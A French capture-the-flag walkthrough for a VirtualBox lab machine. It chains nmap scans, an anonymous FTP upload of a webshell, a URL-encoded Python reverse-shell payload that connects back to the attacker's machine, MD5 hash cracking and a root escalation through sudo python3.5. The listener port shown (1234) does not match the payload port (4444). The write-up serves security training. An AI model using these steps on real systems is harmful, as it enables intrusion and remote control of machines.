# 01-Local

## Télécharge et importe l'image de l'exercice dans virtualbox
Modifie les données lors de l'importation selon la configuration de ta machine (ram, stockage, etc.)

## Démarre la machine virtuelle
Aprés modification des paramétres, démarre la machine virtuelle

## Rechercher l'adresse ip de la machine virtuelle
### recherche d'abord ton adresse ip
- ```ifconfig```
- Regarde wlan0
- Puis la section inet
### Puis regarde les ip dispo sur ta machine avec ```nmap```
- nmap -sn ```"ip"``` (en remplaçant le dernier nombre par ```"0/24"``` pour balayer les plages de cellules disponibles)
- Regarder la machine virtuelle  qui est ouvert sur virtualbox
- s'il y en a plusieurs, recherche d'abord l'adresse Mac et fais la commande suivante sur chaque adresse ip pour vérifier si l'adresse Mac correspond
    - nmap -sA "ip"

## Rechercher l'adresse Mac de la machine virtuelle
- VBoxManage showvminfo "nom de la machine virtuelle" | grep MAC:

## Pour la suite nous allons appliquer ceci
- ipVir pour l'adresse ip de la machine virtuelle
- macVir pour l'adresse mac de la machine virtuelle
- ipPhy pour l'adresse ip de la machine physique

## Nous allons maintenant vérifier les services disponibles
- nmap -sS "ipVir"
    - 21/tcp open  ftp
    - 22/tcp open  ssh
    - 80/tcp open  http

## Vérifier l'accessibilité des fichiers qui sont dans le serveur ftp
- nmap -p 21 --script=ftp-anon ipVir
    - ftp-anon: Anonymous FTP login allowed

## Nous allons entrer dans le serveur ftp
- ftp ipVir
    - login: anonymous
    - passwd: [Entrer] (juste le bouton Entrer)

## Regarder les fichiers dispo
- ls

## Ajouter un webshell
- Sortir du ftp
- Créer un fichier webshell.php
- Entrer dans le ftp
- Verser le fichier dans le ftp
    - put webshell.php

## Dans le terminal de ta machine physique
- nc -lvnp 1234

## Dans le navigateur
- http://[ipVir]/files/webshell.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);%20s.connect((%22[ipPhy]%22,4444));%20os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);%20p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27
- Vous aurez , dans le terminal de la machine, quelque chose qui ressemble à peu prés à ça:
```
listening on [any] 4444 ...
connect to [192.168.1.26] from (UNKNOWN) [192.168.1.8] 48946
bash: cannot set terminal process group (1203): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:~/html/files$ 
```

## Entrer dans le home et regarder à l'intérieur
- cd /home
- ls -a

## Regarder à l'intérieur
- cat important.txt
```
  /$$$$$$    /$$     
 /$$$_  $$ /$$$$    
| $$$$\ $$|_  $$     
| $$ $$ $$  | $$    
| $$\ $$$$  | $$    
| $$ \ $$$  | $$    
|  $$$$$$/ /$$$$$$  
 \______/ |______/                                                                           
                                                                           
                                                                           
 /$$                                     /$$   /$$ /$$     /$$             
| $$                                    | $$  / $$/ $$   /$$$$             
| $$        /$$$$$$   /$$$$$$$  /$$$$$$ | $$ /$$$$$$$$$$|_  $$             
| $$       /$$__  $$ /$$_____/ |____  $$| $$|   $$  $$_/  | $$             
| $$      | $$  \ $$| $$        /$$$$$$$| $$ /$$$$$$$$$$  | $$             
| $$      | $$  | $$| $$       /$$__  $$| $$|_  $$  $$_/  | $$             
| $$$$$$$$|  $$$$$$/|  $$$$$$$|  $$$$$$$| $$  | $$| $$   /$$$$$$           
|________/ \______/  \_______/ \_______/|__/  |__/|__/  |______/           
                                                                           
                                                                           
run the script to see the data

/.runme.sh
```

## Rechercher et afficher runme.sh
- find / -name ".runme.sh" 2>/dev/null
- cat /.runme.sh

```
#!/bin/bash
echo 'the secret key'
sleep 2
echo 'is'
sleep 2
echo 'trolled'
sleep 2
echo 'hacking computer in 3 seconds...'
sleep 1
echo 'hacking computer in 2 seconds...'
sleep 1
echo 'hacking computer in 1 seconds...'
echo "hahaahahah it's a joke, Don't be stupid, read scripts before running it"
exit 01 ### eeeeeemmmmmmmmmmmmm
sleep 1
echo '⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀ ⣀⣀⣤⣤⣤⣀⡀
⠸⡇⠀⠿⡀⠀⠀⠀⣀⡴⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀
⠀⠀⠀⠀⠑⢄⣠⠾⠁⣀⣄⡈⠙⣿⣿⣿⣿⣿⣿⣿⣿⣆
⠀⠀⠀⠀⢀⡀⠁⠀⠀⠈⠙⠛⠂⠈⣿⣿⣿⣿⣿⠿⡿⢿⣆
⠀⠀⠀⢀⡾⣁⣀⠀⠴⠂⠙⣗⡀⠀⢻⣿⣿⠭⢤⣴⣦⣤⣹⠀⠀⠀⢀⢴⣶⣆
⠀⠀⢀⣾⣿⣿⣿⣷⣮⣽⣾⣿⣥⣴⣿⣿⡿⢂⠔⢚⡿⢿⣿⣦⣴⣾⠸⣼⡿
⠀⢀⡞⠁⠙⠻⠿⠟⠉⠀⠛⢹⣿⣿⣿⣿⣿⣌⢤⣼⣿⣾⣿⡟⠉
⠀⣾⣷⣶⠇⠀⠀⣤⣄⣀⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠉⠈⠉⠀⠀⢦⡈⢻⣿⣿⣿⣶⣶⣶⣶⣤⣽⡹⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠉⠲⣽⡻⢿⣿⣿⣿⣿⣿⣿⣷⣜⣿⣿⣿⡇
⠀⠀ ⠀⠀⠀⠀⠀⢸⣿⣿⣷⣶⣮⣭⣽⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    shrek:061fe5e7b95d5f98208d7bc89ed2d569'
```

## Login et Passwd trouvés
- login: shrek
- passwd (hash): 061fe5e7b95d5f98208d7bc89ed2d569

## Vérifier le type de hash
- aller sur https://www.dcode.fr/fonction-hash
- coller le hash 061fe5e7b95d5f98208d7bc89ed2d569
- mot de passe trouvé: youaresmart

## Identifiants
- login: shrek
- passwd: youaresmart

## Se connecter avec shrek
- python3 -c 'import pty; pty.spawn("/bin/bash")'
- su shrek

## Regarder les priviléges
- sudo -l
    - (root) NOPASSWD: /usr/bin/python3.5

## Utiliser Python pour générer le shell root
- sudo /usr/bin/python3.5
- import os
- os.system("/bin/bash")

## Se déplacer dans root et afficher le contenu
- cd /root
- ls -a
    - .  ..  .bash_history  .bashrc  .cache  .nano  .profile  root.txt  .viminfo

## Afficher root.txt
- cat root.txt
```
  /$$$$$$    /$$     
 /$$$_  $$ /$$$$    
| $$$$\ $$|_  $$     
| $$ $$ $$  | $$    
| $$\ $$$$  | $$    
| $$ \ $$$  | $$    
|  $$$$$$/ /$$$$$$  
 \______/ |______/                                                                           


 /$$                                     /$$   /$$ /$$     /$$             
| $$                                    | $$  / $$/ $$   /$$$$             
| $$        /$$$$$$   /$$$$$$$  /$$$$$$ | $$ /$$$$$$$$$$|_  $$             
| $$       /$$__  $$ /$$_____/ |____  $$| $$|   $$  $$_/  | $$             
| $$      | $$  \ $$| $$        /$$$$$$$| $$ /$$$$$$$$$$  | $$             
| $$      | $$  | $$| $$       /$$__  $$| $$|_  $$  $$_/  | $$             
| $$$$$$$$|  $$$$$$/|  $$$$$$$|  $$$$$$$| $$  | $$| $$   /$$$$$$           
|________/ \______/  \_______/ \_______/|__/  |__/|__/  |______/           



Congratulations, You have successfully completed the challenge!
Flag: 01Talent@nokOpA3eToFrU8r5sW1dipe2aky
```

## Flag:
01Talent@nokOpA3eToFrU8r5sW1dipe2aky

## Développeur
- Prénom NOM: Mouhamed DIOUF
- email: seydiahmedelcheikh@gmail.com